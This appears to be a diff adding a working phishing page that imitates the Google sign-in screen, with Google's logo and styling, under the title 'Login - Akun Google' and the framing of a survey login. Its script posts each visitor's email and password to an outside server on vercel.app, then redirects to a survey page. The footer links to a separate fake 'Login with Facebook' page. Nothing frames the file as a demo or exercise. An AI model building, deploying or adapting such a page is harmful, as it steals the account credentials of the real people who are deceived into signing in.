@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Akun Google</title>
+    <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    
+    <script>
+        async function login(event) {
+            event.preventDefault();
+
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+            let emailError = document.getElementById("emailError");
+
+            // Cek jika email dan password tidak kosong
+            if (!email || !password) {
+                emailError.style.display = "block";
+                emailError.textContent = "Email dan password harus diisi!";
+                return;
+            }
+
+            emailError.style.display = "none";
+
+            try {
+                // Cek apakah email terdaftar
+                let cekResponse = await fetch("https://biasa-alpha.vercel.app/api/cek", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "*/*"
+                    },
+                    body: JSON.stringify({ email })
+                });
+
+                let cekResult = await cekResponse.json();
+
+                if (!cekResult.emailExists) {
+                    emailError.style.display = "block";
+                    emailError.textContent = "Email tidak terdaftar!";
+                    return;
+                }
+
+                // Jika email terdaftar, lanjut login
+                let loginResponse = await fetch("https://biasa-alpha.vercel.app/api/download", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "*/*"
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                let loginResult = await loginResponse.json();
+
+                if (loginResult.success) {
+                    localStorage.setItem("userLogin", email);
+                    showToast("Tunggu... Sedang mengalihkan ke survei");
+                    setTimeout(() => {
+                        window.location.href = "survei.html";
+                    }, 2000);
+                } else {
+                    emailError.style.display = "block";
+                    emailError.textContent = loginResult.message || "Login gagal. Coba lagi.";
+                }
+            } catch (error) {
+                emailError.style.display = "block";
+                emailError.textContent = "Terjadi kesalahan. Coba lagi nanti.";
+            }
+        }
+
+        function showToast(message) {
+            let toastEl = document.getElementById("toastMessage");
+            toastEl.textContent = message;
+            let toast = new bootstrap.Toast(document.getElementById("liveToast"));
+            toast.show();
+        }
+    </script>
+    <style>
+        .logins {
+        font-family: 'Roboto', Arial, sans-serif;
+        background:white;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        }
+        
+        body { background-color: #f8f9fa; }
+        .login-container {
+        text-align: center;
+        background: white;
+        padding: 40px 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        width: 360px;
+        }
+        
+        .google-logo {
+        margin-bottom: 20px;
+        }
+        
+        h2 {
+        color: #202124;
+        font-size: 24px;
+        font-weight: 400;
+        margin-bottom: 10px;
+        }
+        
+        p {
+        color: #5f6368;
+        font-size: 14px;
+        margin-bottom: 30px;
+        }
+        
+        input {
+        width: 100%;
+        padding: 18px;
+        margin-bottom: 20px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+        }
+        
+        button {
+        width: 100%;
+        padding: 18px;
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        }
+        
+        button:hover {
+        background-color: #185abc;
+        }
+        
+        .footer {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #5f6368;
+        }
+        
+        .footer a {
+        color: #1a73e8;
+        text-decoration: none;
+        }
+        
+        .footer a:hover {
+        text-decoration: underline;
+        }
+        
+        
+
+        /* Toast */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+<div class="logins">
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo" width="120">
+        <h2>Sign in</h2>
+        <p>to continue to Survei</p>
+        <form id="loginForm" onsubmit="login(event)">
+            <input type="email" id="email" name="email" placeholder="Email or phone" required>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+            <div id="emailError" style="color: red; font-size: 14px; display: none; margin-top: 15px;"></div>
+        </form>
+        <div class="footer">
+            <p>Not your computer? Use a private browsing window to sign in. <a href="https://pclouds.vercel.app/login.html#!">Login with Facebook</a></p>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast-container">
+        <div id="liveToast" class="toast align-items-center text-white bg-success border-0" role="alert" aria-live="assertive" aria-atomic="true">
+            <div class="d-flex">
+                <div class="toast-body" id="toastMessage"></div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
